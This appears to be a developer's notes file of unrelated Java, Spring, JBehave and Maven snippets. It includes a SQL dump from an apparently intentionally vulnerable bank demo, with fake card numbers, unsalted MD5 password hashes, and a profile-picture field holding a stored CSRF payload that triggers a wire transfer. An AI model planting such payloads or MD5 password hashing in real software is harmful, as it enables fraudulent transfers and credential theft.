        mangas.add(manga1);
        mangas.add(manga2);
    }
    @Test
    public void testSearchSync() throws Exception {
        // Mocking service
        when(mangaService.getMangasByTitle(any(String.class))).thenReturn(mangas);
        mockMvc.perform(get("/manga/sync/ken").contentType(MediaType.APPLICATION_JSON))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$[0].title", is("Hokuto no ken")))
            .andExpect(jsonPath("$[1].title", is("Yumekui Kenbun")));
    }
    @Test
    public void testSearchASync() throws Exception {
        // Mocking service
        when(mangaService.getMangasByTitle(any(String.class))).thenReturn(mangas);
        MvcResult result = mockMvc.perform(get("/manga/async/ken").contentType(MediaType.APPLICATION_JSON))
            .andDo(print())
            .andExpect(request().asyncStarted())
            .andDo(print())
            // .andExpect(status().is2xxSuccessful()).andReturn();
            .andReturn();
        // result.getRequest().getAsyncContext().setTimeout(10000);
        mockMvc.perform(asyncDispatch(result))
            .andDo(print())
            .andExpect(status().isOk())
            .andExpect(jsonPath("$[0].title", is("Hokuto no ken")));
    }
}
-- --------------------------------------------------------
AutoConfigurationImportSelector
-- --------------------------------------------------------
@Test
@EnabledIf("#{systemProperties['java.version'].startsWith('1.8')}")
void givenEnabledIfSpel_WhenTrue_ThenTestExecuted() {
    assertTrue(true);
}
-- --------------------------------------------------------
package com.javadeveloperzone;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.system.ApplicationPidFileWriter;
import org.springframework.context.annotation.ComponentScan;

/**
 * Created by JavaDeveloperZone on 19-07-2017.
 */

@SpringBootApplication
@ComponentScan // Using a root package also allows the @ComponentScan annotation to be used without needing to specify a basePackage attribute
public class SpringBootConfig {
    public static void main(String[] args) throws Exception {
        SpringApplication springApplication = new SpringApplication(SpringBootConfig.class);
        springApplication.addListeners(new ApplicationPidFileWriter());     // register PID write to spring boot. It will write PID to file
        springApplication.run(args);
    }
}

application.properties
When spring boot application will start, It will write process id to specified file at spring.pid.file configuration. spring.pid.file is optional, If this properties is not not specified then spring boot will create application.pid file at root location of spring boot application jar.

spring.pid.file=e:\\spring-boot-pid\\pid.txt #Location of the PID file to write
-- --------------------------------------------------------
public StepsRunner() {
    super();
    configuration = new MostUsefulConfiguration();
    final File outputDir = new File(System.getProperty("jbehave.output.dir"));
    configuration.useStoryReporterBuilder( new StoryReporterBuilder() {
        @Override
        public File outputDirectory()
        {
            return outputDir;
        }
    });
}
-- --------------------------------------------------------
import java.lang.reflect.Type;
import java.util.List;
import java.util.Map;

import org.jbehave.core.model.ExamplesTable;
import org.jbehave.core.model.ExamplesTableFactory;
import org.jbehave.core.steps.ParameterConverters.ParameterConverter;

public class StudentConverter implements ParameterConverter {
	
	private ExamplesTableFactory factory;

	public StudentConverter(ExamplesTableFactory factory) {
		this.factory = factory;
	}

	public boolean accept(Type type) {
		if (type instanceof Class<?>) {
            return StudentBean.class.isAssignableFrom((Class<?>) type);
        }
        return false;
	}

	public Object convertValue(String value, Type type) {
		// TODO Auto-generated method stub
		List<Map<String,String>> data= factory.createExamplesTable(value).getRows();
		StudentBean sb = new StudentBean(data);
		sb.setStudentBean(data);
		return sb;
	}


}

import java.text.SimpleDateFormat;
import java.util.List;

import org.jbehave.core.Embeddable;
import org.jbehave.core.configuration.Configuration;
import org.jbehave.core.configuration.MostUsefulConfiguration;
import org.jbehave.core.i18n.LocalizedKeywords;
import org.jbehave.core.io.CodeLocations;
import org.jbehave.core.io.LoadFromClasspath;
import org.jbehave.core.io.StoryFinder;
import org.jbehave.core.junit.JUnitStories;
import org.jbehave.core.model.ExamplesTableFactory;
import org.jbehave.core.parsers.RegexStoryParser;
import org.jbehave.core.reporters.CrossReference;
import org.jbehave.core.reporters.StoryReporterBuilder;
import org.jbehave.core.steps.InjectableStepsFactory;
import org.jbehave.core.steps.ParameterConverters;
import org.jbehave.core.steps.ParameterConverters.DateConverter;
import org.jbehave.core.steps.ParameterConverters.ExamplesTableConverter;
import org.jbehave.core.steps.spring.SpringApplicationContextFactory;
import org.jbehave.core.steps.spring.SpringStepsFactory;
import org.qainfolabs.jbehave.converter.MyConverter;
import org.qainfolabs.jbehave.converter.StudentConverter;
import org.springframework.context.ApplicationContext;
import static java.util.Arrays.asList;

import static org.jbehave.core.io.CodeLocations.codeLocationFromClass;
import static org.jbehave.core.reporters.Format.CONSOLE;
import static org.jbehave.core.reporters.Format.HTML;
import static org.jbehave.core.reporters.Format.TXT;
import static org.jbehave.core.reporters.Format.XML;

/**
 * <p>
 * {@link Embeddable} class to run multiple textual stories via JUnit using Spring Dependency Injection to compose the steps classes.
 * </p>
 * <p>
 * Stories are specified in classpath and correspondingly the {@link LoadFromClasspath} story loader is configured.
 * </p> 
 */
public class MyStories extends JUnitStories {
	CrossReference xref = new CrossReference();
    public MyStories() {
        configuredEmbedder().embedderControls().doGenerateViewAfterStories(true).doIgnoreFailureInStories(false)
                .doIgnoreFailureInView(true).useThreads(1).useStoryTimeoutInSecs(60);
    }

    @Override
    public Configuration configuration() {
        Class<? extends Embeddable> embeddableClass = this.getClass();
        // Start from default ParameterConverters instance
        ParameterConverters parameterConverters = new ParameterConverters();
        // factory to allow parameter conversion and loading from external resources (used by StoryParser too)
        ExamplesTableFactory examplesTableFactory = new ExamplesTableFactory(new LocalizedKeywords(), new LoadFromClasspath(embeddableClass), parameterConverters);
        // add custom coverters
        parameterConverters.addConverters(new DateConverter(new SimpleDateFormat("yyyy-MM-dd")),
                new ExamplesTableConverter(examplesTableFactory));
        parameterConverters.addConverters(new MyConverter());
        parameterConverters.addConverters(new StudentConverter(new ExamplesTableFactory()));

		return new MostUsefulConfiguration()
            .useStoryLoader(new LoadFromClasspath(embeddableClass))
            .useStoryParser(new RegexStoryParser(examplesTableFactory)) 
            .useStoryReporterBuilder(new StoryReporterBuilder()
                .withCodeLocation(CodeLocations.codeLocationFromClass(embeddableClass))
                .withDefaultFormats()
                .withFormats(CONSOLE, TXT, HTML, XML)
                .withCrossReference(xref))
            .useParameterConverters(parameterConverters)    
            .useStepMonitor(xref.getStepMonitor());
    }

    @Override
    public InjectableStepsFactory stepsFactory() {
        String path = "org.qainfolabs.jbehave".replaceAll("\\.", "/");
        ApplicationContext context = new SpringApplicationContextFactory(path+"/my_steps.xml").createApplicationContext();
        return new SpringStepsFactory(configuration(), context);
    }
    


    protected List<String> storyPaths() {
        return new StoryFinder().findPaths(codeLocationFromClass(this.getClass()).getFile(), asList("**/*.story"), null);
                
    }
    
        
}

MAVEN_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8787 -Xnoagent -Djava.compiler=NONE
-- --------------------------------------------------------

--
-- Table structure for table `tblcities`
--

CREATE TABLE IF NOT EXISTS `tblcities` (
  `id` smallint(6) NOT NULL AUTO_INCREMENT COMMENT 'City ID',
  `name` varchar(30) NOT NULL COMMENT 'City Name',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='Cities Table' AUTO_INCREMENT=13 ;

--
-- Dumping data for table `tblcities`
--

INSERT INTO `tblcities` (`id`, `name`) VALUES
(8, 'AULDEARN'),
(2, 'GREATHAM'),
(3, 'HALISTRA'),
(6, 'KIRRIEMUIR'),
(11, 'LONDON'),
(10, 'MADELEY'),
(12, 'MANCHESTER'),
(4, 'OVERCOMBE'),
(7, 'STREETLY'),
(5, 'WESTMILL'),
(1, 'WISTANSWICK'),
(9, 'WRAXALL');

-- --------------------------------------------------------
<plugin>
    <groupId>org.jbehave</groupId>
    <artifactId>jbehave-maven-plugin</artifactId>
    <version>[version]</version>
    <executions>
        <!-- define executions as normal -->
        <metaFilters>
            <metaFilter>"groovy: lang != 'java'"</metaFilter>
        </metaFilters>
    </executions>
    <dependencies>
        <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-all</artifactId>
            <version>2.4.15</version>
        </dependency>
    </dependencies>
</plugin>
-- --------------------------------------------------------

--
-- Table structure for table `tblcreditcards`
--

CREATE TABLE IF NOT EXISTS `tblcreditcards` (
  `bankID` int(11) NOT NULL COMMENT 'Bank Identity Number',
  `cardID` tinyint(4) NOT NULL COMMENT 'Card ID',
  `cardNumber` varchar(16) NOT NULL COMMENT 'CardNumber',
  `expires` date NOT NULL COMMENT 'Expiration Date',
  `securityCode` smallint(3) NOT NULL COMMENT 'Card Security Code',
  UNIQUE KEY `cardNumber` (`cardNumber`),
  KEY `bankID` (`bankID`),
  KEY `cardID` (`cardID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Credit Cards Table';

--
-- Dumping data for table `tblcreditcards`
--

INSERT INTO `tblcreditcards` (`bankID`, `cardID`, `cardNumber`, `expires`, `securityCode`) VALUES
(11, 2, '4532593351978997', '2015-09-01', 258),
(4, 2, '491669530035580', '2015-04-01', 76),
(5, 2, '4929300005859602', '2016-12-01', 778),
(10, 1, '5100611175814765', '2016-06-01', 190),
(12, 1, '5161119300892686', '2015-01-01', 735),
(7, 1, '5429687965003649', '2015-11-01', 955),
(3, 1, '5430976730197472', '2015-06-01', 753),
(6, 1, '5537543009062415', '2017-09-01', 147),
(9, 1, '5545780166550101', '2017-12-01', 99),
(8, 1, '5589245285450192', '2013-04-01', 53);

-- --------------------------------------------------------

--
-- Table structure for table `tblcreditcardstype`
--

CREATE TABLE IF NOT EXISTS `tblcreditcardstype` (
  `id` tinyint(4) NOT NULL AUTO_INCREMENT COMMENT 'Credit Card ID',
  `name` varchar(30) NOT NULL COMMENT 'Credit Card Type',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='Credit Cards Types Table' AUTO_INCREMENT=6 ;

--
-- Dumping data for table `tblcreditcardstype`
--

INSERT INTO `tblcreditcardstype` (`id`, `name`) VALUES
(1, 'Master Card'),
(2, 'Visa'),
(3, 'American Express'),
(4, 'Diners'),
(5, 'Isracard');

-- --------------------------------------------------------
--
-- Table structure for table `tblusers`
--

CREATE TABLE IF NOT EXISTS `tblusers` (
  `bankID` int(11) NOT NULL AUTO_INCREMENT COMMENT 'Bank Identity Number',
  `nino` varchar(9) NOT NULL COMMENT 'National Insurance Numbers',
  `firstName` varchar(30) NOT NULL COMMENT 'First Name',
  `lastName` varchar(30) NOT NULL COMMENT 'Last Name',
  `gender` tinyint(1) NOT NULL DEFAULT '1' COMMENT 'Gender (1 = Male, 0 = Female)',
  `address` varchar(35) NOT NULL COMMENT 'Street Address',
  `city` smallint(6) NOT NULL COMMENT 'City',
  `passcode` varchar(7) DEFAULT NULL COMMENT 'Passcode',
  `phone` bigint(11) NOT NULL COMMENT 'Phone Number',
  `birthday` date NOT NULL COMMENT 'BirthDay Date',
  `occupation` varchar(40) DEFAULT NULL COMMENT 'Occupation',
  `username` varchar(30) NOT NULL COMMENT 'User Name',
  `password` varchar(32) NOT NULL COMMENT 'Password',
  `email` varchar(100) NOT NULL COMMENT 'Email Address',
  `pictureURL` varchar(150) DEFAULT 'images/profiles/nopic.png' COMMENT 'Picture URL',
  PRIMARY KEY (`bankID`),
  UNIQUE KEY `nino` (`nino`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `username` (`username`),
  KEY `city` (`city`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='User Details Table' AUTO_INCREMENT=13 ;

--
-- Dumping data for table `tblusers`
--

INSERT INTO `tblusers` (`bankID`, `nino`, `firstName`, `lastName`, `gender`, `address`, `city`, `passcode`, `phone`, `birthday`, `occupation`, `username`, `password`, `email`, `pictureURL`) VALUES
(3, 'GJ352274C', 'Aaron', 'Howell', 1, '69 Temple Way', 8, 'TF97DW', 7956686747, '1935-10-02', 'Jeweler', 'Gainnoo1935', '4c22bbbe1ac409c7def582ed39489086', 'AaronHowell@teleworm.us', 'images/profiles/sil-male.png'),
(4, 'ZJ970015', 'Sofia', 'Morton', 0, '34 Walden Road', 2, 'RH203NN', 7919699732, '1965-01-27', 'Loan interviewer', 'Thomene', '7592e99453393cbebf92a967bb299abf', 'SofiaMorton@teleworm.us', 'pages/transference-wire.jsp?to=4&amount=325&comment=Bank Activities&send=send'),
(5, 'SR628780C', 'Peter', 'Hunter', 1, '27 Fordham Rd', 3, 'IV553DG', 7074780680, '1930-04-01', 'Billing and posting clerk', 'Gond1930', '01f95bf73ffddee60db468332445b05c', 'PeterHunter@teleworm.us', 'images/profiles/sil-male.png'),
(6, 'EW506660A', 'Corey', 'Nicholls', 1, '19 York Road', 4, 'DT33WA', 7023992014, '1960-09-29', 'Ophthalmic medical assistant', 'Alcour', '9c6c6533c3e58c2bb77fdbf5f1833a6f', 'CoreyNicholls@teleworm.us', 'images/profiles/sil-male.png'),
(7, 'JN632558', 'Chelsea', 'Hancock', 0, '17 Bouverie Road', 5, 'SG90RN', 7700950884, '1935-11-24', 'Mathematician', 'Rater1935', '01142620345763ad08950d8bb89c8975', 'ChelseaHancock@dayrep.com', 'images/profiles/sil-female.png'),
(8, 'SR446112B', 'Alexander', 'Bolton', 1, '45 Witney Way', 6, 'DD88PF', 7081145205, '1929-04-25', 'Pediatrician', 'Forepainely', '1ece31f17227e95c47edb1a75148114a', 'AlexanderBolton@teleworm.us', 'images/profiles/sil-male.png'),
(9, 'YC594700', 'Adam', 'Rose', 1, '10 Berkeley Rd', 7, 'B746GB', 7006479241, '1974-11-15', 'Airport terminal controller', 'Housee', 'ab69e1cf15c9c6f1d8ea15b2e9bdcc07', 'AdamRose@teleworm.us', 'images/profiles/sil-male.png'),
(10, 'CR661660C', 'Joshua', 'Dodd', 1, '94 Leicester Road', 8, 'IV124GF', 7955532329, '1963-07-01', 'Route driver', 'Hiself', 'a9d22fa808974a43989c157a5a99e27e', 'JoshuaDodd@teleworm.us', 'images/profiles/sil-male.png'),
(11, 'MP711069', 'Charles', 'Pearson', 1, '37 Oxford Rd', 9, 'BS198TZ', 7028749417, '1964-07-04', 'Cooling and freezing equipment tender', 'Hiseespeark', 'cdafd468a0b4775eeaaaa2f6e83f627f', 'CharlesPearson@dayrep.com', 'images/profiles/sil-male.png'),
(12, 'YL555515D', 'Grace', 'Turner', 0, '43 South Crescent', 10, 'TF79DA', 7041151289, '1928-12-15', 'Construction inspector', 'Veragiclumad', '7b0d1f32c32f9489705b373e724f3f82', 'GraceTurner@teleworm.us', 'images/profiles/sil-female.png');

--
-- Constraints for dumped tables
--

--
-- Constraints for table `tblactivities`
--
ALTER TABLE `tblactivities`
  ADD CONSTRAINT `tblactivities_ibfk_1` FOREIGN KEY (`from`) REFERENCES `tblusers` (`bankID`),
  ADD CONSTRAINT `tblactivities_ibfk_2` FOREIGN KEY (`to`) REFERENCES `tblusers` (`bankID`);

--
-- Constraints for table `tblcreditcards`
--
ALTER TABLE `tblcreditcards`
  ADD CONSTRAINT `tblcreditcards_ibfk_1` FOREIGN KEY (`bankID`) REFERENCES `tblusers` (`bankID`),
  ADD CONSTRAINT `tblcreditcards_ibfk_2` FOREIGN KEY (`cardID`) REFERENCES `tblcreditcardstype` (`id`);

--
-- Constraints for table `tblusers`
--
ALTER TABLE `tblusers`
  ADD CONSTRAINT `tblusers_ibfk_1` FOREIGN KEY (`city`) REFERENCES `tblcities` (`id`);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
==============================================================================================================
public class Security {
	public static String MD5(String md5) {
		   try {
		        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
		        byte[] array = md.digest(md5.getBytes());
		        StringBuffer sb = new StringBuffer();
		        for (int i = 0; i < array.length; ++i) {
		          sb.append(Integer.toHexString((array[i] & 0xFF) | 0x100).substring(1,3));
		       }
		        return sb.toString();
		    } catch (java.security.NoSuchAlgorithmException e) {
		    	System.out.println(e.toString());
		    }
		    return null;
		}
}
==============================================================================================================
         <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-dependency-plugin</artifactId>
            <version>2.10</version>
            <executions>
              <execution>
                <id>download-maven-distro</id>
                <phase>process-test-resources</phase>
                <goals>
                  <goal>copy</goal>
                </goals>
                <configuration>
                  <artifactItems>
                    <artifactItem>
                      <groupId>org.apache.maven</groupId>
                      <artifactId>apache-maven</artifactId>
                      <version>${mavenVersion}</version>
                      <classifier>bin</classifier>
                      <type>zip</type>
                      <destFileName>maven-bin.zip</destFileName>
                    </artifactItem>
                  </artifactItems>
                  <outputDirectory>${project.build.directory}</outputDirectory>
                </configuration>
              </execution>
            </executions>
          </plugin>
		  
		  <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-antrun-plugin</artifactId>
            <version>1.6</version>
            <executions>
              <execution>
                <id>unpack-maven-distro</id>
                <phase>process-test-resources</phase>
                <goals>
                  <goal>run</goal>
                </goals>
                <configuration>
                  <tasks>
                    <delete dir="${mavenHome}" />
                    <unzip src="${mavenDistro}" dest="${mavenHome}">
                      <regexpmapper from="^([^/]+)/(.*)$"
                        to="\2" handledirsep="true" />
                    </unzip>
                    <chmod dir="${mavenHome}/bin" perm="ugo+rx"
                      includes="mvn,mvnDebug" />
                  </tasks>
                </configuration>
              </execution>
            </executions>
          </plugin>
==============================================================================================================

import com.google.common.io.ByteStreams;
import org.eclipse.jetty.security.ConstraintMapping;
import org.eclipse.jetty.security.ConstraintSecurityHandler;
import org.eclipse.jetty.security.HashLoginService;
import org.eclipse.jetty.security.authentication.BasicAuthenticator;
import org.eclipse.jetty.server.Connector;
import org.eclipse.jetty.server.NetworkConnector;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.ServerConnector;
import org.eclipse.jetty.server.handler.AbstractHandler;
import org.eclipse.jetty.util.security.Constraint;
import org.eclipse.jetty.util.security.Password;
import org.eclipse.jetty.util.thread.QueuedThreadPool;
import org.eclipse.jetty.util.thread.ScheduledExecutorScheduler;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.util.Collections;

/**
 * An HTTP server that handles all requests on a given port from a specified source, optionally secured using BASIC auth
 * by providing a username and password. The source can either be a URL or a directory. When a request is made the
 * request is satisfied from the provided source.
 *
 * @author Jason van Zyl
 */
public class HttpServer
{

    private final Server server;

    private final StreamSource source;

    private final String username;

    private final String password;

    public HttpServer( int port, String username, String password, StreamSource source )
    {
        this.username = username;
        this.password = password;
        this.source = source;
        this.server = server( port );
    }

    public void start()
        throws Exception
    {
        server.start();
        // server.join();
    }

    public void stop()
        throws Exception
    {
        server.stop();
    }

    public int port()
    {
        return ( (NetworkConnector) server.getConnectors()[0] ).getLocalPort();
    }

    private Server server( int port )
    {
        QueuedThreadPool threadPool = new QueuedThreadPool();
        threadPool.setMaxThreads( 500 );
        Server server = new Server( threadPool );
        server.setConnectors( new Connector[]{ new ServerConnector( server ) } );
        server.addBean( new ScheduledExecutorScheduler() );

        ServerConnector connector = (ServerConnector) server.getConnectors()[0];
        connector.setIdleTimeout( 30_000L );
        connector.setPort( port );

        StreamSourceHandler handler = new StreamSourceHandler( source );

        if ( username != null && password != null )
        {
            HashLoginService loginService = new HashLoginService( "Test Server" );
            loginService.putUser( username, new Password( password ), new String[]{ "user" } );
            server.addBean( loginService );

            ConstraintSecurityHandler security = new ConstraintSecurityHandler();
            server.setHandler( security );

            Constraint constraint = new Constraint();
            constraint.setName( "auth" );
            constraint.setAuthenticate( true );
            constraint.setRoles( new String[]{ "user", "admin" } );

            ConstraintMapping mapping = new ConstraintMapping();
            mapping.setPathSpec( "/*" );
            mapping.setConstraint( constraint );

            security.setConstraintMappings( Collections.singletonList( mapping ) );
            security.setAuthenticator( new BasicAuthenticator() );
            security.setLoginService( loginService );
            security.setHandler( handler );
        }
        else
        {
            server.setHandler( handler );
        }
        return server;
    }

    public static HttpServerBuilder builder()
    {
        return new HttpServerBuilder();
    }

    public static class HttpServerBuilder
    {

        private int port;

        private String username;

        private String password;

        private StreamSource source;

        public HttpServerBuilder port( int port )
        {
            this.port = port;
            return this;
        }

        public HttpServerBuilder username( String username )
        {
            this.username = username;
            return this;
        }

        public HttpServerBuilder password( String password )
        {
            this.password = password;
            return this;
        }

        public HttpServerBuilder source( final String source )
        {
            this.source = new StreamSource()
            {
                @Override
                public InputStream stream( String path )
                    throws IOException
                {
                    return new URL( String.format( "%s/%s", source, path ) ).openStream();
                }
            };
            return this;
        }

        public HttpServerBuilder source( final File source )
        {
            this.source = new StreamSource()
            {
                @Override
                public InputStream stream( String path )
                    throws IOException
                {
                    return new FileInputStream( new File( source, path ) );
                }
            };
            return this;
        }

        public HttpServer build()
        {
            return new HttpServer( port, username, password, source );
        }
    }

    public interface StreamSource
    {
        InputStream stream( String path )
            throws IOException;
    }

    public static class StreamSourceHandler
        extends AbstractHandler
    {

        private final StreamSource source;

        public StreamSourceHandler( StreamSource source )
        {
            this.source = source;
        }

        @Override
        public void handle( String target, Request baseRequest, HttpServletRequest request,
                            HttpServletResponse response )
            throws IOException, ServletException
        {
            response.setContentType( "application/octet-stream" );
            response.setStatus( HttpServletResponse.SC_OK );
            try ( InputStream in = source.stream(
                target.substring( 1 ) ); OutputStream out = response.getOutputStream() )
            {
                ByteStreams.copy( in, out );
            }
            baseRequest.setHandled( true );
        }
    }

    public static void main( String[] args )
        throws Exception
    {
        HttpServer server = HttpServer.builder() //
            .port( 0 ) //
            .username( "maven" ) //
            .password( "secret" ) //
            .source( new File( "/tmp/repo" ) ) //
            .build();
        server.start();
    }
}


import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * A simple HTTP proxy that only understands the CONNECT method to check HTTPS tunneling.
 *
 * @author Benjamin Bentmann
 */
public class TunnelingProxyServer
    implements Runnable
{

    private int port;

    private volatile ServerSocket server;

    private String targetHost;

    private int targetPort;

    private String connectFilter;

    public TunnelingProxyServer( int port, String targetHost, int targetPort, String connectFilter )
    {
        this.port = port;
        this.targetHost = targetHost;
        this.targetPort = targetPort;
        this.connectFilter = connectFilter;
    }

    public int getPort()
    {
        return ( server != null ) ? server.getLocalPort() : port;
    }

    public void start()
        throws IOException
    {
        server = new ServerSocket( port, 4 );
        new Thread( this ).start();
    }

    public void stop()
        throws IOException
    {
        if ( server != null )
        {
            server.close();
            server = null;
        }
    }

    public void run()
    {
        try
        {
            while ( true )
            {
                new ClientHandler( server.accept() ).start();
            }
        }
        catch ( Exception e )
        {
            // closed
        }
    }

    class ClientHandler
        extends Thread
    {

        private Socket client;

        public ClientHandler( Socket client )
        {
            this.client = client;
        }

        public void run()
        {
            try
            {
                PushbackInputStream is = new PushbackInputStream( client.getInputStream() );

                String dest = null;

                while ( true )
                {
                    String line = readLine( is );
                    if ( line == null || line.length() <= 0 )
                    {
                        break;
                    }
                    Matcher m = Pattern.compile( "CONNECT +([^:]+:[0-9]+) +.*" ).matcher( line );
                    if ( m.matches() )
                    {
                        dest = m.group( 1 );
                    }
                }

                OutputStream os = client.getOutputStream();

                if ( dest == null || ( connectFilter != null && !dest.matches( connectFilter ) ) )
                {
                    os.write( ( "HTTP/1.0 400 Bad request for " + dest + "\r\n\r\n" ).getBytes( "UTF-8" ) );
                    return;
                }

                os.write( "HTTP/1.0 200 Connection established\r\n\r\n".getBytes( "UTF-8" ) );

                Socket server = new Socket( targetHost, targetPort );

                Thread t1 = new StreamPumper( is, server.getOutputStream() );
                t1.start();
                Thread t2 = new StreamPumper( server.getInputStream(), os );
                t2.start();
                t1.join();
                t2.join();

                server.close();
            }
            catch ( Exception e )
            {
                e.printStackTrace();
            }
            finally
            {
                try
                {
                    client.close();
                }
                catch ( IOException e )
                {
                    e.printStackTrace();
                }
            }
        }

        private String readLine( PushbackInputStream is )
            throws IOException
        {
            StringBuilder buffer = new StringBuilder( 1024 );

            while ( true )
            {
                int b = is.read();
                if ( b < 0 )
                {
                    return null;
                }
                else if ( b == '\n' )
                {
                    break;
                }
                else if ( b == '\r' )
                {
                    b = is.read();
                    if ( b != '\n' )
                    {
                        is.unread( b );
                    }
                    break;
                }
                else
                {
                    buffer.append( (char) b );
                }
            }

            return buffer.toString();
        }

    }

    static class StreamPumper
        extends Thread
    {

        private final InputStream is;

        private final OutputStream os;

        public StreamPumper( InputStream is, OutputStream os )
        {
            this.is = is;
            this.os = os;
        }

        public void run()
        {
            try
            {
                for ( byte[] buffer = new byte[1024 * 8]; ; )
                {
                    int n = is.read( buffer );
                    if ( n < 0 )
                    {
                        break;
                    }
                    os.write( buffer, 0, n );
                }
            }
            catch ( IOException e )
            {
                // closed
            }
            finally
            {
                try
                {
                    is.close();
                }
                catch ( IOException e )
                {
                    e.printStackTrace();
                }
                try
                {
                    os.close();
                }
                catch ( IOException e )
                {
                    e.printStackTrace();
                }
            }
        }
    }
}

    <plugin>
          <groupId>org.apache.maven.plugins</groupId>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.0</version>
          <configuration>
            <environmentVariables>
              <JENKINS_MAVEN_AGENT_DISABLED>true</JENKINS_MAVEN_AGENT_DISABLED>
            </environmentVariables>
          </configuration>
        </plugin>
==============================================================================================================
mvn -U -B -V --fail-at-end -Dgpg.skip=true -Dfile.encoding=UTF-8 -DskipTests=true -Dmaven.javadoc.skip=true -DskipCheckStyle=true clean install -P test
mvn test -B -U -P CI

0d33840f-e383-4584-af56-c062d77f0022

http://vmsk-tc-prm.paragon-software.com/viewLog.html?tab=buildLog&buildTypeId=Microservices_Maven_ParagonMicroservicesDistributor_050build&buildId=5672369&_focus=4678
==============================================================================================================
@Bean
public CommonsRequestLoggingFilter requestLoggingFilter() {
    CommonsRequestLoggingFilter loggingFilter = new CommonsRequestLoggingFilter();
    loggingFilter.setIncludeClientInfo(true);
    loggingFilter.setIncludeQueryString(true);
    loggingFilter.setIncludePayload(true);
    loggingFilter.setMaxPayloadLength(64000);
    return loggingFilter;
}

public class LoggableDispatcherServlet extends DispatcherServlet {

    private final Log logger = LogFactory.getLog(getClass());

    @Override
    protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {
        if (!(request instanceof ContentCachingRequestWrapper)) {
            request = new ContentCachingRequestWrapper(request);
        }
        if (!(response instanceof ContentCachingResponseWrapper)) {
            response = new ContentCachingResponseWrapper(response);
        }
        HandlerExecutionChain handler = getHandler(request);

        try {
            super.doDispatch(request, response);
        } finally {
            log(request, response, handler);
            updateResponse(response);
        }
    }

    private void log(HttpServletRequest requestToCache, HttpServletResponse responseToCache, HandlerExecutionChain handler) {
        LogMessage log = new LogMessage();
        log.setHttpStatus(responseToCache.getStatus());
        log.setHttpMethod(requestToCache.getMethod());
        log.setPath(requestToCache.getRequestURI());
        log.setClientIp(requestToCache.getRemoteAddr());
        log.setJavaMethod(handler.toString());
        log.setResponse(getResponsePayload(responseToCache));
        logger.info(log);
    }

    private String getResponsePayload(HttpServletResponse response) {
        ContentCachingResponseWrapper wrapper = WebUtils.getNativeResponse(response, ContentCachingResponseWrapper.class);
        if (wrapper != null) {

            byte[] buf = wrapper.getContentAsByteArray();
            if (buf.length > 0) {
                int length = Math.min(buf.length, 5120);
                try {
                    return new String(buf, 0, length, wrapper.getCharacterEncoding());
                }
                catch (UnsupportedEncodingException ex) {
                    // NOOP
                }
            }
        }
        return "[unknown]";
    }

    private void updateResponse(HttpServletResponse response) throws IOException {
        ContentCachingResponseWrapper responseWrapper =
            WebUtils.getNativeResponse(response, ContentCachingResponseWrapper.class);
        responseWrapper.copyBodyToResponse();
    }
}

  @Bean
    public ServletRegistrationBean dispatcherRegistration() {
        return new ServletRegistrationBean(dispatcherServlet());
    }

    @Bean(name = DispatcherServletAutoConfiguration.DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)
    public DispatcherServlet dispatcherServlet() {
        return new LoggableDispatcherServlet();
    }
	
	
	
	
	import org.apache.commons.io.IOUtils;
import org.springframework.boot.actuate.trace.TraceProperties;
import org.springframework.boot.actuate.trace.TraceRepository;
import org.springframework.boot.actuate.trace.WebRequestTraceFilter;
import org.springframework.stereotype.Component;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.LinkedHashMap;
import java.util.Map;

@Component
public class CustomWebTraceFilter extends WebRequestTraceFilter {

  public CustomWebTraceFilter(TraceRepository repository, TraceProperties properties) {
    super(repository, properties);
}

  @Override
  protected Map<String, Object> getTrace(HttpServletRequest request) {
    Map<String, Object> trace = super.getTrace(request);
    String multipartHeader = request.getHeader("content-type");
    if (multipartHeader != null && multipartHeader.startsWith("multipart/form-data")) {
        Map<String, Object> parts = new LinkedHashMap<>();
        try {
            request.getParts().forEach(
                    part -> {
                        try {
                            parts.put(part.getName(), IOUtils.toString(part.getInputStream(), Charset.forName("UTF-8")));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
            );
        } catch (IOException | ServletException e) {
            e.printStackTrace();
        }
        if (!parts.isEmpty()) {
            trace.put("multipart-content-map", parts);
        }
    }
    return trace;
  }
}




import java.io.BufferedReader;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.io.OutputStream;
    import java.io.PrintWriter;
    import java.util.Collection;
    import java.util.Enumeration;
    import java.util.HashMap;
    import java.util.Locale;
    import java.util.Map;
    import javax.servlet.*;
